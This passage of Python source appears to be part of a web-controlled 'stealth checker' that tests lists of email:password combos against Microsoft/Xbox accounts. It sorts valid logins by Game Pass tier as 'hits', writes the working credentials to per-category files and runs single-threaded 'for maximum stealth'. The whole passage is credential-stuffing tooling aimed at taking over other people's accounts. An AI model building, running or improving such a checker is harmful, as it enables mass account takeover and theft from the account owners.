                                    elif any(gamepass in full_text for gamepass in [
                                        'game pass', 'gamepass', 'xbox game pass pc', 'xbox game pass console'
                                    ]):
                                        game_pass_type = 'core'
                                        active_subscriptions.append(display_name or name)
                                    
                                    # Check for other Xbox services
                                    elif any(xbox in full_text for xbox in [
                                        'xbox', 'live gold', 'xbox live'
                                    ]):
                                        active_subscriptions.append(display_name or name)
                                    
                                    # Any other active Microsoft subscription
                                    elif any(ms in full_text for ms in [
                                        'microsoft', 'office', '365', 'onedrive'
                                    ]):
                                        active_subscriptions.append(display_name or name)
            
            # Return results based on findings
            if game_pass_type == 'core':
                return {
                    'status': 'core',
                    'subscription': 'Xbox Game Pass Core/PC',
                    'message': 'Active Game Pass subscription found'
                }
            elif active_subscriptions:
                return {
                    'status': 'success',
                    'subscription': ', '.join(active_subscriptions[:3]),  # Limit to first 3
                    'message': 'Microsoft subscriptions found'
                }
            else:
                return {
                    'status': 'free',
                    'subscription': 'Microsoft Account',
                    'message': 'Valid account but no active subscriptions'
                }
                
        except Exception as e:
            logger.error(f"Subscription analysis failed for {email}: {str(e)}")
            return {
                'status': 'free',
                'subscription': 'Microsoft Account',
                'message': 'Valid account, subscription analysis failed'
            }
    
# Global storage for checker instances and control flags
stealth_checkers = {}
checker_control = defaultdict(lambda: {'running': False, 'paused': False})

class StealthChecker:
    """Main stealth checker class"""
    
    def __init__(self, session_id, socketio):
        self.session_id = session_id
        self.socketio = socketio
        self.api = StealthAPI()
        self.stats = {
            'total': 0,
            'checked': 0,
            'ultimate': 0,
            'core': 0,
            'pc_console': 0, 
            'free': 0,
            'invalid': 0,
            'errors': 0,
            'start_time': datetime.now(),
            'status': 'running'
        }
        
        # Result storage
        self.results = {
            'ultimate': [],
            'core': [],
            'pc_console': [],
            'free': [],
            'invalid': [],
            'errors': []
        }
        
        # Session directory
        self.session_dir = f"sessions/session_{session_id}"
        os.makedirs(self.session_dir, exist_ok=True)
    
    def check_account(self, email, password):
        """Check a single account with stealth"""
        try:
            logger.info(f"🎮 Checking: {email}")
            
            # Emit progress update
            self.socketio.emit('progress_update', {
                'session_id': self.session_id,
                'current_account': email,
                'checked': self.stats['checked'],
                'total': self.stats['total']
            })
            
            result = self.api.authenticate_account(email, password)
            
            # Process result
            account_data = f"{email}:{password}"
            status = result.get('status', 'error')
            
            if status == 'ultimate':
                self.results['ultimate'].append(account_data)
                self.stats['ultimate'] += 1
                logger.info(f"✅ ULTIMATE HIT: {email}")
            elif status == 'core':
                self.results['core'].append(account_data)
                self.stats['core'] += 1
                logger.info(f"🔵 CORE HIT: {email}")
            elif status == 'pc_console':
                self.results['pc_console'].append(account_data)
                self.stats['pc_console'] += 1
                logger.info(f"🟡 PC/CONSOLE HIT: {email}")
            elif status == 'free':
                self.results['free'].append(account_data)
                self.stats['free'] += 1
                logger.info(f"⚪ FREE ACCOUNT: {email}")
            elif status == 'invalid':
                self.results['invalid'].append(account_data)
                self.stats['invalid'] += 1
                logger.info(f"❌ INVALID: {email}")
            else:
                self.results['errors'].append(f"{account_data} - {result.get('message', 'Unknown error')}")
                self.stats['errors'] += 1
                logger.error(f"⚠️ ERROR: {email} - {result.get('message', 'Unknown error')}")
            
            self.stats['checked'] += 1
            
            # Save results to files
            self._save_results()
            
            # Emit stats update
            self.socketio.emit('stats_update', self._get_stats_dict())
            
            return result
            
        except Exception as e:
            logger.error(f"Error checking account {email}: {e}")
            self.results['errors'].append(f"{email}:{password} - Checker error: {str(e)}")
            self.stats['errors'] += 1
            self.stats['checked'] += 1
            return {'status': 'error', 'message': str(e)}
    
    def _save_results(self):
        """Save results to individual files"""
        file_mapping = {
            'ultimate': 'stealth_ultimate_hits.txt',
            'core': 'stealth_core_accounts.txt',
            'pc_console': 'stealth_pc_console_accounts.txt', 
            'free': 'stealth_free_accounts.txt',
            'invalid': 'stealth_invalid_accounts.txt',
            'errors': 'stealth_errors.txt'
        }
        
        for result_type, filename in file_mapping.items():
            file_path = os.path.join(self.session_dir, filename)
            with open(file_path, 'w', encoding='utf-8') as f:
                for item in self.results[result_type]:
                    f.write(f"{item}\n")
    
    def _get_stats_dict(self):
        """Get stats as dictionary"""
        elapsed = datetime.now() - self.stats['start_time']
        
        return {
            'session_id': self.session_id,
            'total': self.stats['total'],
            'checked': self.stats['checked'],
            'ultimate': self.stats['ultimate'],
            'core': self.stats['core'], 
            'pc_console': self.stats['pc_console'],
            'free': self.stats['free'],
            'invalid': self.stats['invalid'],
            'errors': self.stats['errors'],
            'elapsed_time': str(elapsed).split('.')[0],
            'status': self.stats['status'],
            'progress_percentage': (self.stats['checked'] / self.stats['total'] * 100) if self.stats['total'] > 0 else 0
        }

def start_stealth_checker(combos, session_id, socketio):
    """Start the stealth checking process"""
    try:
        logger.info(f"🎮 Starting Xbox stealth checker for session {session_id}")
        
        # Initialize checker
        checker = StealthChecker(session_id, socketio)
        stealth_checkers[session_id] = checker
        checker_control[session_id]['running'] = True
        checker_control[session_id]['paused'] = False
        
        checker.stats['total'] = len(combos)
        
        # Emit initial stats
        socketio.emit('stats_update', checker._get_stats_dict())
        
        # Process accounts one by one (single-threaded for maximum stealth)
        for i, (email, password) in enumerate(combos):
            # Check for pause/stop signals
            if not checker_control[session_id]['running']:
                logger.info(f"⏹️ Checker stopped for session {session_id}")
                break
                
            while checker_control[session_id]['paused']:
                time.sleep(1)
                if not checker_control[session_id]['running']:
                    break
            
            if not checker_control[session_id]['running']:
                break
            
            # Check the account
            checker.check_account(email, password)
        
        # Mark as completed
        checker.stats['status'] = 'completed'
        checker_control[session_id]['running'] = False
        
        # Final stats update
        socketio.emit('stealth_check_completed', checker._get_stats_dict())
        
        logger.info(f"🎮 Xbox stealth checker completed for session {session_id}")
        logger.info(f"📊 Results: {checker.stats['ultimate']} Ultimate, {checker.stats['core']} Core, " +
                   f"{checker.stats['pc_console']} PC/Console, {checker.stats['free']} Free, " +
                   f"{checker.stats['invalid']} Invalid")
        
    except Exception as e:
        logger.error(f"Error in stealth checker: {e}")
        socketio.emit('error', {
            'session_id': session_id,
            'message': f'Checker error: {str(e)}'
        })

def pause_stealth_checker(session_id):
    """Pause the stealth checker"""
    if session_id in checker_control:
        checker_control[session_id]['paused'] = True
        logger.info(f"⏸️ Paused stealth checker for session {session_id}")

def stop_stealth_checker(session_id):
    """Stop the stealth checker"""
    if session_id in checker_control:
        checker_control[session_id]['running'] = False
        checker_control[session_id]['paused'] = False
        logger.info(f"⏹️ Stopped stealth checker for session {session_id}")

def is_stealth_session_active(session_id):
    """Check if a stealth session is active"""
    return (session_id in checker_control and 
            checker_control[session_id]['running'])

def generate_stealth_stats(session_id):
    """Generate statistics for a stealth session"""
    if session_id in stealth_checkers:
        return stealth_checkers[session_id]._get_stats_dict()
    
    # Return empty stats if session doesn't exist
    return {
        'session_id': session_id,
        'total': 0,
        'checked': 0,
        'ultimate': 0,
        'core': 0,
        'pc_console': 0,
        'free': 0,
        'invalid': 0,
        'errors': 0,
        'elapsed_time': '00:00:00',
        'status': 'inactive',
        'progress_percentage': 0
    }
